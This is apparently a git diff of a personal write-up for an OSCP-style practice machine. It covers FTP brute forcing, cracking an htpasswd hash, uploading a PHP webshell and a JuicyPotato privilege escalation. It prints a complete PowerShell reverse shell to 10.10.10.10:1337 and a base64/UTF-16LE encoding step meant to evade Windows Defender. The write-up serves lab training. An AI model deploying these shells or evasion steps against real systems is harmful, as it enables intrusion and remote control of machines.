@@ -6,7 +6,7 @@ Difficulty:  Intermediate
 Goals:  
 - TJNull List OSCP-like machine - return to form
 Learnt:
-- 
+- A lot of php 
 Beyond Root:
 - PHP webshell
 
@@ -18,28 +18,39 @@ Beyond Root:
 The time to live(ttl) indicates its OS. It is a decrementation from each hop back to original ping sender. Linux is < 64, Windows is < 128.
 ![ping](Screenshots/ping.png)
 
+Nmap returned anonymous access to the FTP server. A quick brute force of non encrypted FTP allows for both anonymous login and Administrative access to write files to the server.
 ![](hydraftp.png)
+## Default Password 
 
+With the default password 
 ```
 wget -r ftp://admin:admin@192.168.174.46/
 ```
 
+We can then crack the hash in .htpasswd used to restrict access on the web server
 ![](htpasswd.png)
 
+This just a MD5 hash 
 ![](apache1hash.png)
 
+That leads to being able read and execute uploaded files from the FTP server in the root web directory that requires authentication. 
 ![](hashcatcracked.png)
 
+Regardless of using an uncommon port to host a web server we can still access this in simplistic set of step discussed previously.
 ![](offseceliteforwebpage.png)
 
+Then uploading a webshell.
 ![](webadeshell.png)
 
 https://sushant747.gitbooks.io/total-oscp-guide/content/webshell.html
 
+I ran it into some issues that were easily fixed - it is just accessing the webshell page without providing data for the cmd to execute arbitrary commands on the webserver 
 ![](nowebshellsadness.png)
 
+For the beyond root I decided to learn some PHP and cobble together my own webshell:
 ![](mademyownwebshellfromothers.png)
 
+The code is here to copy:
 ```php
 <html>
 <head>
@@ -66,7 +77,7 @@ if(isset($_REQUEST['systemRequest'])){
 </html>
 ```
 
-[Online php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) from [[Wreath-Writeup]] may also help
+I could have also used [Online php-obfuscator](https://www.gaijin.at/en/tools/php-obfuscator) from [[Wreath-Writeup]] may also help in adding to discovery.
 ```php
 <html>
 <head>
@@ -85,8 +96,10 @@ if(isset($_REQUEST['systemRequest'])){
 </html>
 ```
 
+Running `hostname` on the server
 ![](addederrorreportingzero.png)
 
+More improvements to my webshell
 ```php
 <html>
 <head>
@@ -116,7 +129,7 @@ if(isset($_REQUEST['systemRequest'])){
 ```
 
 
-Alh4zr3d's obfuscate reverse shell is just this with the variables changed, save this to a .txt file alter variables where required
+Alh4zr3d's obfuscate reverse shell is just this with the variables changed, save this to a .txt file alter variables where required.
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1337);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
 ```
@@ -126,17 +139,18 @@ He then base64, little endians it: convert it to UTF-16LE, which the Windows Def
 iconv -f ASCII -t UTF-16LE $reverseshell.txt | base64 | tr -d "\n"
 ```
 
-Using Powershell did not work. Uploaded nc.exe felt very dirty doing so.
+Using Powershell did not work. Uploaded nc.exe felt very dirty doing so, but worked.
 ![](ncupload.png)
 
+## PrivEsc
 
+The Privilege Escalation is about finding the right exploit for a weird server. It is a weird Server 2008 version that states it is both a x64 and x86 image. 
 ![](livda.png)
 
 Uploaded JuicyPotato exploit - [decoder exploit blog](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/) via FTP as presumably for FTP is being used by an administrator to interact with this box so no need for smelling the juiciest of potatoes, which smell very, very bad. 
 ![](juicypotato.png)
 
-Forgot that my arsenal was not categorised correctly and uploaded the x64 version, because I am stupid. So used not being able to run `systeminfo` 
-
+Forgot that my arsenal was not categorised correctly and uploaded the x64 version, because I am stupid. So used not being able to run `systeminfo`. Also as previously stated it a weird version with OS name even spelt incorrectly.
 ![](systeminfo.png)
 
 I will use the BITS CLSID to remind myself of the exploit more than anything:
@@ -166,15 +180,8 @@ But it is not actually running...
 Ran wes.py and there are lots of Privilege Escalations to fall back on if required. I am just concern that seImpersonate Privilege is just glaring in the face. Due to the only documentation on any of the github repositories directly mentioning Windows Server 2008. I decided to retry the original. 
 
 Try https://github.com/antonioCoco/RogueWinRM
-## Exploit
 
 
-
-## Foothold
-
-## PrivEsc
-
-![](AuthBy-map.excalidraw.md)
 
 ## Beyond Root
 
